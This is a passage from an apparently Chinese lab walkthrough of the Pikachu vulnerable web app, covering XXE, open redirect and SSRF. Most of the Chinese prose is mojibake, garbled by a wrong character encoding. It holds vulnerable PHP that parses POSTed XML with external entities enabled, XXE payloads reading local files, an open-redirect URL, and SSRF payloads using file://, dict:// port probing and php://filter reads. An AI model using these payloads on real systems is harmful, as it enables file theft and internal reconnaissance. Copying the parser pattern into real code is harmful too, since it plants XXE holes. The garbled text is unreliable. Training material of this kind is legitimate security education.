<font style="color:rgb(57, 57, 57);">ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚</font>  
<font style="color:rgb(57, 57, 57);">ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚</font>  

<font style="color:rgb(57, 57, 57);">æœ¬ç« æä¾›çš„æ¡ˆä¾‹ä¸­,ä¸ºäº†æ¨¡æ‹Ÿæ¼æ´,é€šè¿‡æ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†xmlå¤–éƒ¨å®ä½“è§£æã€‚</font>
>



## <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">XML+DTDåŸºæœ¬è¯­æ³•</font>
<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">DTD(Document Type Definition), å³æ–‡æ¡£å®šä¹‰ç±»å‹, ç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸ</font>

```plain
<!--å£°æ˜xmlçš„ç‰ˆæœ¬å·-->
<?xml version="1.0"?>

<!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯noteç±»å‹çš„æ–‡æ¡£-->
<!DOCTYPE note[ 

<!--å¤–éƒ¨å®ä½“å£°æ˜-->        
<!ENTITY entity-name SYSTEM "URI/URL">

]>

<!--æ–‡æ¡£å…ƒç´ --> 
<note>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```





æºç ï¼š\WWW\pikachu-master\vul\xxe\xxe_1.php

```php
$html='';
//è€ƒè™‘åˆ°ç›®å‰å¾ˆå¤šç‰ˆæœ¬é‡Œé¢libxmlçš„ç‰ˆæœ¬éƒ½>=2.9.0äº†,æ‰€ä»¥è¿™é‡Œæ·»åŠ äº†LIBXML_NOENTå‚æ•°å¼€å¯äº†å¤–éƒ¨å®ä½“è§£æ
if(isset($_POST['submit']) and $_POST['xml'] != null){


    $xml =$_POST['xml'];
//    $xml = $test;
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ã€æ–‡æ¡£å…ƒç´ è¿™äº›éƒ½ææ‡‚äº†å—?</p>";
    }
}
```

å‰ç«¯å°†`$_POST['xml']`ä¼ é€’ç»™å˜é‡`$xml,` ç”±äºåå°æ²¡æœ‰å¯¹æ­¤å˜é‡è¿›è¡Œå®‰å…¨åˆ¤æ–­å°±ç›´æ¥ä½¿ç”¨`simplexml_load_string`å‡½æ•°è¿›è¡Œxmlè§£æ, ä»è€Œå¯¼è‡´xxeæ¼æ´

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">å› æ­¤å¯ä»¥æ„å»ºæ¶æ„xmlé€šè¿‡postè¯·æ±‚æäº¤ç»™åå°, ä»¥æ­¤å®ç°xmlå¤–éƒ¨å®ä½“æ³¨å…¥, è¿™é‡Œå…ˆæ„å»ºä¸ªç®€å•çš„xmlæäº¤è¯•è¯•, é¡µé¢æˆåŠŸå›æ˜¾"hello world"</font>

```plain
<?xml version="1.0" encoding="UTF-8" ?>
 
<!DOCTYPE note [
    <!ENTITY test "hello world">
]>
 
<name>&test;</name>
```

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622990.png)

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">xmlå¤–éƒ¨å¼•ç”¨ä¸ä»…æ”¯æŒfileåè®®, è¿˜æ”¯æŒhttp, ftpåè®®</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">å¦‚ä¸‹ä»£ç æ‰€ç¤º, åˆ©ç”¨fileåè®®è¯»å–ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</font>

```plain
<?xml version="1.0"?>
<!DOCTYPE ANY[ 
<!ENTITY file SYSTEM "file:///D:/1.txt">
]>
<x>&file;</x>
```

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632315.png)

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"></font>

# <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">14ã€URL é‡å®šå‘</font>
> <font style="color:rgb(57, 57, 57);">ä¸å®‰å…¨çš„urlè·³è½¬</font>
>
>   
<font style="color:rgb(57, 57, 57);">ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚</font>  
<font style="color:rgb(57, 57, 57);">å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯</font>  
<font style="color:rgb(57, 57, 57);">å°±å¯èƒ½å‘ç”Ÿ"è·³é”™å¯¹è±¡"çš„é—®é¢˜ã€‚</font>  

<font style="color:rgb(57, 57, 57);">urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:</font>  
<font style="color:rgb(57, 57, 57);">-->é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</font>  

<font style="color:rgb(57, 57, 57);">è¿™ä¸ªæ¼æ´æ¯”è¾ƒç®€å•,come on,æ¥æµ‹ä¸€æŠŠ!</font>
>

<font style="color:rgb(57, 57, 57);"></font>

é¢˜ç›®ç»™å‡ºäº†å››ä¸ªé“¾æ¥ï¼Œä¾æ¬¡æŸ¥çœ‹å…¶è¯·æ±‚çš„åœ°å€ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616303.png)

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619490.png)



åé¢ä¿©ä¸ªé“¾æ¥çš„è¯·æ±‚æ˜¯ï¼š

urlredirect.php?url=unsafere.php

urlredirect.php?url=i



å¦‚æœå°† url çš„å‚æ•°æ¢æˆå…¶ä»–çš„ç½‘ç«™ï¼š

[http://pikachu:8765/vul/urlredirect/urlredirect.php?url=](http://pikachu:8765/vul/urlredirect/urlredirect.php?url=i#)http://www.baidu.com

ä»–å°±ä¼šè·³è½¬åˆ°å¯¹åº”ç½‘ç«™

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630826.gif)

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

# <font style="color:rgb(57, 57, 57);">15ã€SSRF</font>
> **<font style="color:rgb(57, 57, 57);">SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</font>**
>
> <font style="color:rgb(57, 57, 57);">å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯</font>**<font style="color:rgb(57, 57, 57);">æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</font>**<font style="color:rgb(57, 57, 57);">,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</font>
>
> <font style="color:rgb(57, 57, 57);">å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</font>  

<font style="color:rgb(57, 57, 57);">æ•°æ®æµ:æ”»å‡»è€…----->æœåŠ¡å™¨---->ç›®æ ‡åœ°å€</font>  

<font style="color:rgb(57, 57, 57);">æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·</font>
>

```plain
PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:
file_get_contents()
fsockopen()
curl_exec()
```

> <font style="color:rgb(57, 57, 57);">å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š("æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚")çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,</font>**<font style="color:rgb(57, 57, 57);">åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤</font>**<font style="color:rgb(57, 57, 57);">ã€‚</font>  

<font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥æ ¹æ®"SSRF"é‡Œé¢çš„é¡¹ç›®æ¥ææ‡‚é—®é¢˜çš„åŸå› </font>
>

<font style="color:rgb(57, 57, 57);"></font>

## <font style="color:rgb(57, 57, 57);">15.1 SSRF (curl)</font>
ç‚¹å‡»é“¾æ¥ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628383.png)



å¹¶æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„èµ„æºï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å¯¹æºæ–‡ä»¶è¿›è¡Œä¸€äº›æ”¹åŠ¨ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620303.png)



æ‰¾åˆ°æ–‡ä»¶ï¼š\WWW\pikachu-master\vul\ssrf\ssrf_curl.php

å°†å…¶ä¸­çš„é»˜è®¤åœ°å€æ›´æ”¹ä¸ºæˆ‘ä»¬æ­å»ºçš„ç½‘ç«™çš„åœ°å€

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634634.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629301.png)





æœ¬é¢˜é‡‡ç”¨äº† http åè®®è¿›è¡Œè®¿é—®èµ„æºï¼Œä¹Ÿå°±æ˜¯æœåŠ¡å™¨çš„åç«¯ä½¿ç”¨äº† curl å‘½ä»¤ï¼ˆ<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">Curlå‘½ä»¤æ”¯æŒå¤šç§åè®®, å¦‚httpã€httpsã€ftpã€fileã€gopheråè®®ç­‰ç­‰</font>ï¼‰ã€‚

é‚£ä¹ˆåˆ©ç”¨ curl å‘½ä»¤çš„ file åè®®ï¼Œè®¿é—®æœ¬åœ°èµ„æºï¼š

`[http://pikachu:8765/vul/ssrf/ssrf_curl.php?url=](http://pikachu:8765/vul/ssrf/ssrf_curl.php?url=http://pikachu:8765/vul/ssrf/ssrf_info/info1.php)file:///D://1.txt`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615320.png)



åˆ©ç”¨ dict åè®®ï¼Œæ‰«æç«¯å£æ˜¯å¦å¼€æ”¾

`[http://pikachu:8765/vul/ssrf/ssrf_curl.php?url=](http://pikachu:8765/vul/ssrf/ssrf_curl.php?url=http://pikachu:8765/vul/ssrf/ssrf_info/info1.php)dict://pikachu:3306`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628412.png)





## 15.2 SSRF (file_get_content)
`file_get_content`å‡½æ•°, è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯è¯»å–æ–‡ä»¶çš„å†…å®¹, å¯ç›´æ¥è¯»å–ä¸»æœºç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„çš„æ–‡ä»¶, ä¹Ÿå¯ä»¥ä½¿ç”¨phpä¼ªåè®®è¿›è¡Œåˆ©ç”¨



[http://pikachu:8765/vul/ssrf/ssrf_fgc.php?file=http://pikachu:8765/vul/ssrf/ssrf_info/info2.php](http://pikachu:8765/vul/ssrf/ssrf_fgc.php?file=http://pikachu:8765/vul/ssrf/ssrf_info/info2.php)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628380.png)



`[http://pikachu:8765/vul/ssrf/ssrf_fgc.php?file=](http://pikachu:8765/vul/ssrf/ssrf_curl.php?url=http://pikachu:8765/vul/ssrf/ssrf_info/info1.php)<font style="color:rgb(57, 57, 57);">file:///D://1.txt</font>`

<font style="color:rgb(57, 57, 57);"></font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634755.png)

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">phpä¼ªåè®®è¯»å–æŒ‡å®šæ–‡ä»¶</font>

`[http://pikachu:8765/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=D://1.txt](http://pikachu:8765/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=D://1.txt)`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625658.png)<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);"> </font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

<font style="color:rgb(57, 57, 57);"></font>

# å‚è€ƒèµ„æ–™ï¼š
[https://cloud.tencent.com/developer/article/2395982](https://cloud.tencent.com/developer/article/2395982)

[https://blog.csdn.net/qq_65165505/article/details/131568188](https://blog.csdn.net/qq_65165505/article/details/131568188)

[https://www.freebuf.com/articles/web/353841.html](https://www.freebuf.com/articles/web/353841.html)

<font style="color:rgb(51, 51, 51);">SQLæ³¨å…¥&é¢„ç¼–è¯‘</font>

[https://forum.butian.net/share/1559](https://forum.butian.net/share/1559)



[https://hello-ctf.com/hc-web/include/](https://hello-ctf.com/hc-web/include/)

